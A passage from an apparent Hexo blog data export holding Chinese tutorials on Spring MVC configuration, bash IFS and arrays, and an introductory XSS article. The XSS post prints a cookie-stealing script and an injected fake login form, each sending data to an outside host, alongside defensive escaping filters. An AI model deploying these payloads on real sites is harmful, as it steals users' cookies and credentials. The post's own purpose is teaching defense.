spring`<context:component-scan>`标签处理逻辑会交给org.springframework.context.config.ContextNamespaceHandler处理，然后季托ComponentScanBeanDefinitionParser会读取配置文件信息并组装成org.springframework.context.annotation.ClassPathBeanDefinitionScanner进行处理。\n2. context:component-scan的子标签，作用有先后顺序，越上面的子标签优先越高。\n3. use-default-filters为true时，实例化ClassPathBeanDefinitionScanner时，会调用registerDefaultFilters，include @Component、@ManagedBean、@Named注解类；否则不include。之后再添加include-filter和exclude-filter里的逻辑。\n\n\n\n## 参考文档\n- [context:component-scan扫描使用上的容易忽略的use-default-filters](http://jinnianshilongnian.iteye.com/blog/1762632)\n- [spring配置中<context:component-scan/>的use-default-filters的作用](http://liuluo129.iteye.com/blog/1943412)\n\n\n","slug":"article/spring/spring mvc service实例化二次问题","published":1,"updated":"2016-03-31T15:24:56.000Z","_id":"cilpxkg9r001aavbt86u2whl0","comments":1,"layout":"post","photos":[],"link":""},{"title":"mvc-view-controller用法","date":"2016-02-28T05:57:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 一、重定向\n``` xml\n<mvc:view-controller path=\"/\" view-name=\"redirect:/admin/index\"/>\n```\n说明：即如果当前路径是/，则重定向到/admin/index\n\n\n## 二、view name\n```\n<mvc:view-controller path=\"/\" view-name=\"admin/index\"/>\n```\n如果当前路径是/，则交给相应的视图解析器直接解析为视图\n如：\n``` xml\n<bean id=\"defaultViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" p:order=\"2\">\n\t<property name=\"viewClass\" value=\"org.springframework.web.servlet.view.JstlView\"/>\n\t<property name=\"contentType\" value=\"text/html\"/>\n\t<property name=\"prefix\" value=\"/WEB-INF/jsp/\"/>\n\t<property name=\"suffix\" value=\".jsp\"/>\n</bean>\n```\n则得到的视图是：/WEB-INF/jsp/admin/index.jsp\n\n\n## 三、参考\nhttp://www.iteye.com/topic/1129445","source":"_posts/article/spring/mvc-view-controller用法.md","raw":"title: mvc-view-controller用法\ntags:\n  - spring\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 13:57:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 一、重定向\n``` xml\n<mvc:view-controller path=\"/\" view-name=\"redirect:/admin/index\"/>\n```\n说明：即如果当前路径是/，则重定向到/admin/index\n\n\n## 二、view name\n```\n<mvc:view-controller path=\"/\" view-name=\"admin/index\"/>\n```\n如果当前路径是/，则交给相应的视图解析器直接解析为视图\n如：\n``` xml\n<bean id=\"defaultViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" p:order=\"2\">\n\t<property name=\"viewClass\" value=\"org.springframework.web.servlet.view.JstlView\"/>\n\t<property name=\"contentType\" value=\"text/html\"/>\n\t<property name=\"prefix\" value=\"/WEB-INF/jsp/\"/>\n\t<property name=\"suffix\" value=\".jsp\"/>\n</bean>\n```\n则得到的视图是：/WEB-INF/jsp/admin/index.jsp\n\n\n## 三、参考\nhttp://www.iteye.com/topic/1129445","slug":"article/spring/mvc-view-controller用法","published":1,"updated":"2016-03-31T15:24:47.000Z","_id":"cilpxkg9t001gavbt2gy57ci7","comments":1,"layout":"post","photos":[],"link":""},{"title":"了解IFS","date":"2016-02-01T09:37:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、介绍\n内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。\n\n通过命令`man bash`可以查看到bash的帮助文档，其中有一段内容如下：\n> The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.\nThe default value is `<space><tab><newline>`.\n\n\n## 二、相关知识\n\n### 1. IFS内容查看\n由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。\n``` bash\necho $IFS | od -a (Output named characters.)\necho $IFS | od -b (Output octal bytes.)\necho $IFS | od -c (Output C-style escaped characters.)\necho $IFS | od -x (Output hexadecimal bytes.)\n```\n\n### 2. 自定义IFS\n一般情况，修改IFS只需给IFS这个全局变量赋值即可。\n例如：设置默认分隔符为冒号`IFS=.`\n\n特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：`IFS=$'\\n'`。\n\n\n## 三、应用实例\n\n### 1. 脚本\n``` bash\n#!/bin/bash\n\nstr=\"172.30.29.173\"\narr=($str)\necho -e \"默认分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nIFS=.\narr=($str)\necho -e \"冒号分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nstr=\"172 30.29 173\"\nIFS=$' '\narr=($str)\necho -e \"空格分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n```\n\n### 2. 输出\n``` bash\nyerba-buena:tmp yeshaoting$ sh ifs.sh\n默认分隔>> 长度：1 内容：172.30.29.173\n冒号分隔>> 长度：4 内容：172 30 29 173\n空格分隔>> 长度：3 内容：172 30.29 173\n```\n\n\n## 四、参考文档\n1. [SHELL中的IFS详解](http://smilejay.com/2011/12/bash_ifs/)\n2. [[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG](http://www.1987.name/205.html)\n3. [Shell中的IFS解惑](http://blog.csdn.net/whuslei/article/details/7187639)\n4. [What is the meaning of IFS=$'\\n' in bash scripting ?](http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting)","source":"_posts/article/shell/了解IFS.md","raw":"title: 了解IFS\ntags:\n  - 实践\n  - shell\ncategories:\n  - 脚本\ndate: 2016-02-01 17:37:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、介绍\n内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。\n\n通过命令`man bash`可以查看到bash的帮助文档，其中有一段内容如下：\n> The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.\nThe default value is `<space><tab><newline>`.\n\n\n## 二、相关知识\n\n### 1. IFS内容查看\n由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。\n``` bash\necho $IFS | od -a (Output named characters.)\necho $IFS | od -b (Output octal bytes.)\necho $IFS | od -c (Output C-style escaped characters.)\necho $IFS | od -x (Output hexadecimal bytes.)\n```\n\n### 2. 自定义IFS\n一般情况，修改IFS只需给IFS这个全局变量赋值即可。\n例如：设置默认分隔符为冒号`IFS=.`\n\n特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：`IFS=$'\\n'`。\n\n\n## 三、应用实例\n\n### 1. 脚本\n``` bash\n#!/bin/bash\n\nstr=\"172.30.29.173\"\narr=($str)\necho -e \"默认分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nIFS=.\narr=($str)\necho -e \"冒号分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nstr=\"172 30.29 173\"\nIFS=$' '\narr=($str)\necho -e \"空格分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n```\n\n### 2. 输出\n``` bash\nyerba-buena:tmp yeshaoting$ sh ifs.sh\n默认分隔>> 长度：1 内容：172.30.29.173\n冒号分隔>> 长度：4 内容：172 30 29 173\n空格分隔>> 长度：3 内容：172 30.29 173\n```\n\n\n## 四、参考文档\n1. [SHELL中的IFS详解](http://smilejay.com/2011/12/bash_ifs/)\n2. [[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG](http://www.1987.name/205.html)\n3. [Shell中的IFS解惑](http://blog.csdn.net/whuslei/article/details/7187639)\n4. [What is the meaning of IFS=$'\\n' in bash scripting ?](http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting)","slug":"article/shell/了解IFS","published":1,"updated":"2016-04-06T07:55:31.000Z","_id":"cilpxkg9y001javbtb8h16tw3","comments":1,"layout":"post","photos":[],"link":""},{"title":"shell关联数组基本用法","date":"2016-02-01T04:35:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n**注**：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。\n\n\n## 一、基本用法\n\n### 1. 数组声明\n``` bash\ndeclare -a arr\n```\n\n\n### 2. 数组赋值\n\n#### 静态赋值\n``` bash\narr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)\n```\n\n#### 动态赋值\n``` bash\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n```\n\n\n### 3. 数组遍历\n\n#### 数组索引(键)\n格式：`${!arr[@]}` 或 `${!arr[*]}`\n\n#### 数组内容(值)\n格式：`${arr[@]}` 或 `${arr[*]}`\n\n\n### 4. 数组长度\n格式：\n``` bash\n${#变量}\n```\n该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。\n\n数组长度：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n数组元素长度：\n``` bash\n${#arr[2]}\n```\n\n\n### 5. 子数组\n格式：\n``` bash\n${#arr:index:end}\n```\n\n\n<!-- more -->\n\n\n## 二、举例\n\n### 1. 实例脚本\n``` bash\n#/bin/bash\n\ndeclare -A arr\n\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n\n\n# 数组长度\necho -e '数组长度${#arr[@]}:\\t'${#arr[@]};\necho -e '数组长度${#arr[@]:1:4}:\\t'${#arr[@]:1:4};\necho -e '单个元素长度${#arr[C]}:\\t'${#arr[C]};\necho -e '单个元素长度${#arr[B]}:\\t'${#arr[B]};\necho -e '';\n\n# 数组\necho -e '数组索引${!arr[@]}:\\t'${!arr[@]};\necho -e '全部数组内容${arr[@]}:\\t'${arr[@]};\necho -e '';\n\n# 数组子串\necho -e '数组子串${arr[@]:2}:\\t'${arr[@]:2};\necho -e '数组子串${arr[@]:1:4}:\\t'${arr[@]:1:4};\necho -e '';\n\n# 数组值\necho -e '数组值${arr[b]}:\\t'${arr[b]};\necho -e '数组值${arr[C]}:\\t'${arr[C]};\necho -e '数组值(大小写敏感)${arr[c]}:\\t'${arr[c]};\n```\n\n\n### 2. 实例输出\n``` bash\n数组长度${#arr[@]}:\t5\n数组长度${#arr[@]:1:4}:\t5\n单个元素长度${#arr[C]}:\t2\n单个元素长度${#arr[B]}:\t4\n\n数组索引${!arr[@]}:\tA B C E b\n全部数组内容${arr[@]}:\tA1 B411 C2 E3 b5\n\n数组子串${arr[@]:2}:\tB411 C2 E3 b5\n数组子串${arr[@]:1:4}:\tA1 B411 C2 E3\n\n数组值${arr[b]}:\tb5\n数组值${arr[C]}:\tC2\n数组值(大小写敏感)${arr[c]}:\n```\n\n\n## 三、附加知识\n\n### 1. 内部域分隔符IFS\nshell里默认使用空格、制表符以及换行为分隔符。\n\n### 2. 数组转换\n字符串可通过()默认通过IFS将字符串直接转换成数组。\n``` bash\nyerba-buena:tmp yeshaoting$ str=\"1 3 2 7 5\"\nyerba-buena:tmp yeshaoting$ arr=($str)\nyerba-buena:tmp yeshaoting$ echo ${arr[@]}\n1 3 2 7 5\nyerba-buena:tmp yeshaoting$ echo ${!arr[@]}\n0 1 2 3 4\n```\n\n### 3. 数组键大小写敏感\n`${arr[C]}`取值为C2，`${arr[c]}`则为空。\n另外，键加不加引号都一样，引号可用于拼接键值操作。\n\n### 4. 关联数组键有序\n关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。\n\n### 5. 索引负值\n数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。\n如果索引值index<-max_num-1，则会报“数组下标不正确”的异常。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[-1]}\n5\nyerba-buena:tmp yeshaoting$ echo ${arr[-5]}\n1\nyerba-buena:tmp yeshaoting$ echo ${arr[-6]}\n-bash: arr: 数组下标不正确\n```\n\n### 6. 索引超过数组最大个数\n不输出任何内容，也不会报错。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[6]}\n```\n\n\n\n## 四、参考文档\n1. [shell 数组应用实例](http://salogs.com/news/2015/08/02/shell-array-demo/)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)","source":"_posts/article/shell/shell关联数组基本用法.md","raw":"title: shell关联数组基本用法\ntags:\n  - 实践\n  - shell\ncategories:\n  - 脚本\ndate: 2016-02-01 12:35:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n**注**：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。\n\n\n## 一、基本用法\n\n### 1. 数组声明\n``` bash\ndeclare -a arr\n```\n\n\n### 2. 数组赋值\n\n#### 静态赋值\n``` bash\narr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)\n```\n\n#### 动态赋值\n``` bash\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n```\n\n\n### 3. 数组遍历\n\n#### 数组索引(键)\n格式：`${!arr[@]}` 或 `${!arr[*]}`\n\n#### 数组内容(值)\n格式：`${arr[@]}` 或 `${arr[*]}`\n\n\n### 4. 数组长度\n格式：\n``` bash\n${#变量}\n```\n该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。\n\n数组长度：\n``` bash\n${#arr[@]}\n${#arr[*]}\n```\n数组元素长度：\n``` bash\n${#arr[2]}\n```\n\n\n### 5. 子数组\n格式：\n``` bash\n${#arr:index:end}\n```\n\n\n<!-- more -->\n\n\n## 二、举例\n\n### 1. 实例脚本\n``` bash\n#/bin/bash\n\ndeclare -A arr\n\narr[\"A\"]=A1\narr[\"C\"]=C2\narr[\"E\"]=E3\narr[\"B\"]=B411\narr[\"b\"]=b5\n\n\n# 数组长度\necho -e '数组长度${#arr[@]}:\\t'${#arr[@]};\necho -e '数组长度${#arr[@]:1:4}:\\t'${#arr[@]:1:4};\necho -e '单个元素长度${#arr[C]}:\\t'${#arr[C]};\necho -e '单个元素长度${#arr[B]}:\\t'${#arr[B]};\necho -e '';\n\n# 数组\necho -e '数组索引${!arr[@]}:\\t'${!arr[@]};\necho -e '全部数组内容${arr[@]}:\\t'${arr[@]};\necho -e '';\n\n# 数组子串\necho -e '数组子串${arr[@]:2}:\\t'${arr[@]:2};\necho -e '数组子串${arr[@]:1:4}:\\t'${arr[@]:1:4};\necho -e '';\n\n# 数组值\necho -e '数组值${arr[b]}:\\t'${arr[b]};\necho -e '数组值${arr[C]}:\\t'${arr[C]};\necho -e '数组值(大小写敏感)${arr[c]}:\\t'${arr[c]};\n```\n\n\n### 2. 实例输出\n``` bash\n数组长度${#arr[@]}:\t5\n数组长度${#arr[@]:1:4}:\t5\n单个元素长度${#arr[C]}:\t2\n单个元素长度${#arr[B]}:\t4\n\n数组索引${!arr[@]}:\tA B C E b\n全部数组内容${arr[@]}:\tA1 B411 C2 E3 b5\n\n数组子串${arr[@]:2}:\tB411 C2 E3 b5\n数组子串${arr[@]:1:4}:\tA1 B411 C2 E3\n\n数组值${arr[b]}:\tb5\n数组值${arr[C]}:\tC2\n数组值(大小写敏感)${arr[c]}:\n```\n\n\n## 三、附加知识\n\n### 1. 内部域分隔符IFS\nshell里默认使用空格、制表符以及换行为分隔符。\n\n### 2. 数组转换\n字符串可通过()默认通过IFS将字符串直接转换成数组。\n``` bash\nyerba-buena:tmp yeshaoting$ str=\"1 3 2 7 5\"\nyerba-buena:tmp yeshaoting$ arr=($str)\nyerba-buena:tmp yeshaoting$ echo ${arr[@]}\n1 3 2 7 5\nyerba-buena:tmp yeshaoting$ echo ${!arr[@]}\n0 1 2 3 4\n```\n\n### 3. 数组键大小写敏感\n`${arr[C]}`取值为C2，`${arr[c]}`则为空。\n另外，键加不加引号都一样，引号可用于拼接键值操作。\n\n### 4. 关联数组键有序\n关联数组依键有序，与插入数组顺序无关。如上例中数组输出结果为：A1 B411 C2 E3 b5。\n\n### 5. 索引负值\n数组索引负值表示从数组末尾输出。其中，-1表示数组最后一个元素，-max_num-1表示数组第一个元素。\n如果索引值index<-max_num-1，则会报“数组下标不正确”的异常。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[-1]}\n5\nyerba-buena:tmp yeshaoting$ echo ${arr[-5]}\n1\nyerba-buena:tmp yeshaoting$ echo ${arr[-6]}\n-bash: arr: 数组下标不正确\n```\n\n### 6. 索引超过数组最大个数\n不输出任何内容，也不会报错。\n``` bash\nyerba-buena:tmp yeshaoting$ arr=(1 3 2 7 5)\nyerba-buena:tmp yeshaoting$ echo ${arr[6]}\n```\n\n\n\n## 四、参考文档\n1. [shell 数组应用实例](http://salogs.com/news/2015/08/02/shell-array-demo/)\n2. [[Shell学习笔记] 数组、关联数组和别名使用](http://www.1987.name/164.html)","slug":"article/shell/shell关联数组基本用法","published":1,"updated":"2016-04-06T07:55:53.000Z","_id":"cilpxkga3001savbtp3hccgad","comments":1,"layout":"post","photos":[],"link":""},{"title":"Syntax error- \"(\" unexpected","date":"2016-02-28T08:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、问题描述\n假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: \"(\" unexpected。\n\n\n## 二、原因\n主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。\n\n\n## 三、解决\n通过将当前通过以下方式可以使 shell 切换回 bash：\n`sudo dpkg-reconfigure dash`\n然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。\n\n\n## 四、参考文档\n[Shell编程笔记——Syntax error: \"(\" unexpected](http://blog.csdn.net/breeze5428/article/details/27353583)\nhttp://ask.chinaunix.net/question/974\nhttp://bbs.csdn.net/topics/390132876","source":"_posts/article/shell/Syntax error- \"(\" unexpected.md","raw":"title: 'Syntax error- \"(\" unexpected'\ntags:\n  - issue\n  - shell\ncategories:\n  - 脚本\ndate: 2016-02-28 16:56:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、问题描述\n假如我们在shell文件定义了一个数组pid=(0 0 0 0)，运行文件后则会收到报错：Syntax error: \"(\" unexpected。\n\n\n## 二、原因\n主要是因为Linux系统shell版本不兼容引起的。 shell的版本有sh,ksh,csh, bash，dash……等等。用命令ls -al /bin/sh可以得到我们当前所用的Linux系统的shell属于何版本。\n\n\n## 三、解决\n通过将当前通过以下方式可以使 shell 切换回 bash：\n`sudo dpkg-reconfigure dash`\n然后选择 no 或者“否 ”，并确认。这样做将重新配置 dash，并使其不作为默认的 shell 工具。\n\n\n## 四、参考文档\n[Shell编程笔记——Syntax error: \"(\" unexpected](http://blog.csdn.net/breeze5428/article/details/27353583)\nhttp://ask.chinaunix.net/question/974\nhttp://bbs.csdn.net/topics/390132876","slug":"article/shell/Syntax error- \"(\" unexpected","published":1,"updated":"2016-04-06T07:55:43.000Z","_id":"cilpxkga6001vavbtkdnyq57g","comments":1,"layout":"post","photos":[],"link":""},{"title":"WEB安全初探之XSS","date":"2016-03-09T07:48:00.000Z","_content":"\nXSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。\n\n## 0x01 XSS攻击的分类\n根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。\n\n### 1. 反射型XSS\n反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。\n攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。\n\n### 2. 存储型XSS\n存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。\n\n\n## 0x02 XSS攻击的手段及其危害\n\n### 1. 窃取Cookie\n具体实现方法：\n先构造语句`<script>window.open('http://dlgyi.rrvv.net/cookie.asp?msg='+document.cookie)</script>`\n这句话意思是打开一个新的窗口，访问http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\n\n### 2. 引导钓鱼\n``` html\n<script>\nfunction hack()\n{\n                   location.replace(“http://www.attackpage.com/record.asp?username=“\n+document.forms[0].user.value + “password=” + document.forms[0].pass.value);\n}\n</script>\n<form>\n<br><br><HR><H3>这个功能需要登录:</H3 >\n<br><br>请输入用户名：<br>\n<input type=”text” id=”user”name=”user”>\n<br>请输入密码：<br>\n<input type=”password” name =“pass”>\n<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>\n</form><br><br><HR>\n```\n注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。\n\n\n<!-- more -->\n\n## 0x03 XSS的预防\n\n### 1. 前端过滤XSS\n``` javascript\nfunction xssCheck(str,reg){\n    return str ? str.replace(reg || /[&<\">'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) {\n        if(b){\n            return a;\n        }else{\n            return {\n                '<':'&lt;',\n                '&':'&amp;',\n                '\"':'&quot;',\n                '>':'&gt;',\n                \"'\":'&#39;',\n            }[a]\n        }\n    }) : '';\n}\n```\n\n### 2. 后端预防\n\n#### spring提供的方法\n``` xml\n<context-param>\n   <param-name>defaultHtmlEscape</param-name>\n   <param-value>true</param-value>\n</context-param>\n\nForms加上：<spring:htmlEscape defaultHtmlEscape=\"true\" />\n```\n\n#### 手动escape\n首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);\n\n#### 后台加Filter\n``` java\nprivate String cleanXSS(String value) {\n    //You'll need to remove the spaces from the html entities below\n    value = value.replaceAll(\"<\", \"& lt;\").replaceAll(\">\", \"& gt;\");\n    value = value.replaceAll(\"\\\\(\", \"& #40;\").replaceAll(\"\\\\)\", \"& #41;\");\n    value = value.replaceAll(\"'\", \"& #39;\");\n    value = value.replaceAll(\"eval\\\\((.*)\\\\)\", \"\");\n    value = value.replaceAll(\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\", \"\\\"\\\"\");\n    value = value.replaceAll(\"script\", \"\");\n    return value;\n}\n```\n\n\n## 0x04 一款XSS漏洞检测爬虫 - XSScrapy\n``` bash\n./xsscrapy.py -u http://example.com\n./xsscrapy.py -u http://example.com/login_page -l loginname\n```\n\n\n## 0x05 XSS练习\nhttp://vulnweb.janusec.com/index-xss.php\n\n\n## 0x06 推荐站点\n- [WooYun知识库](http://drops.wooyun.org/)\n- [FreeBuf黑客与极客](http://www.freebuf.com/)\n- [SecWiki](http://www.sec-wiki.com/index.php)\n\n\n## 0x07 参考文档\n- [XSS的原理分析与解剖](http://www.freebuf.com/articles/web/40520.html)\n- [XSS的原理分析与解剖（第二篇）](http://www.freebuf.com/articles/web/42727.html)\n- [前端防御XSS](http://drops.wooyun.org/web/13009)\n- [Spring MVC防御CSRF、XSS和SQL注入攻击](http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html)\n- [快速、直接的XSS漏洞检测爬虫 – XSScrapy](http://itindex.net/detail/51089-xss-xsscrapy)\n- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)","source":"_posts/article/security/WEB安全初探之XSS.md","raw":"title: WEB安全初探之XSS\ntags:\n  - XSS\ncategories:\n  - 信息安全\ndate: 2016-03-09 15:48:00\n---\n\nXSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。\n\n## 0x01 XSS攻击的分类\n根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。\n\n### 1. 反射型XSS\n反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。\n攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。\n\n### 2. 存储型XSS\n存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。\n\n\n## 0x02 XSS攻击的手段及其危害\n\n### 1. 窃取Cookie\n具体实现方法：\n先构造语句`<script>window.open('http://dlgyi.rrvv.net/cookie.asp?msg='+document.cookie)</script>`\n这句话意思是打开一个新的窗口，访问http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。\n\n### 2. 引导钓鱼\n``` html\n<script>\nfunction hack()\n{\n                   location.replace(“http://www.attackpage.com/record.asp?username=“\n+document.forms[0].user.value + “password=” + document.forms[0].pass.value);\n}\n</script>\n<form>\n<br><br><HR><H3>这个功能需要登录:</H3 >\n<br><br>请输入用户名：<br>\n<input type=”text” id=”user”name=”user”>\n<br>请输入密码：<br>\n<input type=”password” name =“pass”>\n<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>\n</form><br><br><HR>\n```\n注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。\n\n\n<!-- more -->\n\n## 0x03 XSS的预防\n\n### 1. 前端过滤XSS\n``` javascript\nfunction xssCheck(str,reg){\n    return str ? str.replace(reg || /[&<\">'](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) {\n        if(b){\n            return a;\n        }else{\n            return {\n                '<':'&lt;',\n                '&':'&amp;',\n                '\"':'&quot;',\n                '>':'&gt;',\n                \"'\":'&#39;',\n            }[a]\n        }\n    }) : '';\n}\n```\n\n### 2. 后端预防\n\n#### spring提供的方法\n``` xml\n<context-param>\n   <param-name>defaultHtmlEscape</param-name>\n   <param-value>true</param-value>\n</context-param>\n\nForms加上：<spring:htmlEscape defaultHtmlEscape=\"true\" />\n```\n\n#### 手动escape\n首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);\n\n#### 后台加Filter\n``` java\nprivate String cleanXSS(String value) {\n    //You'll need to remove the spaces from the html entities below\n    value = value.replaceAll(\"<\", \"& lt;\").replaceAll(\">\", \"& gt;\");\n    value = value.replaceAll(\"\\\\(\", \"& #40;\").replaceAll(\"\\\\)\", \"& #41;\");\n    value = value.replaceAll(\"'\", \"& #39;\");\n    value = value.replaceAll(\"eval\\\\((.*)\\\\)\", \"\");\n    value = value.replaceAll(\"[\\\\\\\"\\\\\\'][\\\\s]*javascript:(.*)[\\\\\\\"\\\\\\']\", \"\\\"\\\"\");\n    value = value.replaceAll(\"script\", \"\");\n    return value;\n}\n```\n\n\n## 0x04 一款XSS漏洞检测爬虫 - XSScrapy\n``` bash\n./xsscrapy.py -u http://example.com\n./xsscrapy.py -u http://example.com/login_page -l loginname\n```\n\n\n## 0x05 XSS练习\nhttp://vulnweb.janusec.com/index-xss.php\n\n\n## 0x06 推荐站点\n- [WooYun知识库](http://drops.wooyun.org/)\n- [FreeBuf黑客与极客](http://www.freebuf.com/)\n- [SecWiki](http://www.sec-wiki.com/index.php)\n\n\n## 0x07 参考文档\n- [XSS的原理分析与解剖](http://www.freebuf.com/articles/web/40520.html)\n- [XSS的原理分析与解剖（第二篇）](http://www.freebuf.com/articles/web/42727.html)\n- [前端防御XSS](http://drops.wooyun.org/web/13009)\n- [Spring MVC防御CSRF、XSS和SQL注入攻击](http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html)\n- [快速、直接的XSS漏洞检测爬虫 – 